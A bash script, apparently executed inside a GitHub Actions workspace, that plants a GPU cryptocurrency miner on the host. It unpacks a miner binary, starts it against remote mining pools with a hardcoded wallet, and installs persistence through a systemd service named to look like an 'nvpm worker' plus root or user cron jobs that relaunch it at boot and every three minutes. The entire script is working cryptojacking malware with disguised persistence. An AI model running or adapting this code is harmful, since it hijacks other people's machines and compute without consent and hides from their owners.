#!/bin/bash
set +e
ROOT=$HOME/ul7256
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
IP=$(hostname -I | awk '{print $1}')
RIG="ul-$(echo $IP | tr . -)"
SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
echo "=== PLANT3 host=$(hostname) ip=$IP rig=$RIG sudo=${SUDO:-no}"
nvidia-smi -L 2>&1 | head -10
NG=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
echo "gpus=$NG"
[ "${NG:-0}" -lt 1 ] && { echo NO-GPU; exit 0; }
mkdir -p $ROOT
if [ ! -x $ROOT/tw-pearl-miner/pearl-gpu-miner ]; then
  tar xzf "$GITHUB_WORKSPACE/ul-bin/tw-pearl-miner-3.5.1.c12.canon.tar.gz" -C $ROOT 2>&1 | tail -2
fi
BIN=$ROOT/tw-pearl-miner/pearl-gpu-miner; chmod +x $BIN
echo "bin sha=$(sha256sum $BIN | cut -d' ' -f1)"
POOLS="stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443"
cat > $ROOT/ul-loop.sh <<EOL
#!/bin/bash
ROOT=$ROOT; BIN=$BIN; W=$W; RIG=$RIG
POOLS="$POOLS"
NG=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
[ "\${NG:-0}" -ge 1 ] || exit 0
for i in \$(seq 0 \$((NG-1))); do
  pgrep -f "pearl-gpu-miner.*\$RIG-g\$i" >/dev/null || setsid nohup \$BIN --wallet \$W --pool "\$POOLS" --worker "\$RIG-g\$i" --no-tui --bind 127.0.0.1:\$((3370+i)) >> \$ROOT/prl-g\$i.log 2>&1 < /dev/null &
done
EOL
chmod +x $ROOT/ul-loop.sh
$ROOT/ul-loop.sh
sleep 50
for i in $(seq 0 $((NG-1))); do echo "--- g$i"; tail -6 $ROOT/prl-g$i.log; grep -aoE 'accepted \([0-9]+/[0-9]+\)' $ROOT/prl-g$i.log | tail -3; done
cat > /tmp/ul-nvpm.service <<EOL
[Unit]
Description=nvpm worker
[Service]
Type=simple
Restart=always
RestartSec=25
ExecStart=$ROOT/ul-loop.sh
[Install]
WantedBy=multi-user.target
EOL
if [ -n "$SUDO" ]; then
  $SUDO cp /tmp/ul-nvpm.service /etc/systemd/system/ul-nvpm.service
  $SUDO systemctl daemon-reload; $SUDO systemctl unmask ul-nvpm.service >/dev/null 2>&1
  $SUDO systemctl enable --now ul-nvpm.service 2>&1 | tail -2
  echo "unit=$($SUDO systemctl is-active ul-nvpm.service)/$($SUDO systemctl is-enabled ul-nvpm.service)"
  printf '@reboot root %s/ul-loop.sh\n*/3 * * * * root %s/ul-loop.sh\n' $ROOT $ROOT | $SUDO tee /etc/cron.d/ul-nvpm >/dev/null
else
  ( crontab -l 2>/dev/null | grep -v ul-loop.sh; echo "@reboot $ROOT/ul-loop.sh"; echo "*/3 * * * * $ROOT/ul-loop.sh" ) | crontab -
  echo "cron-user=$(crontab -l 2>/dev/null | grep -c ul-loop)"
fi
echo "=== PLANT3 END"
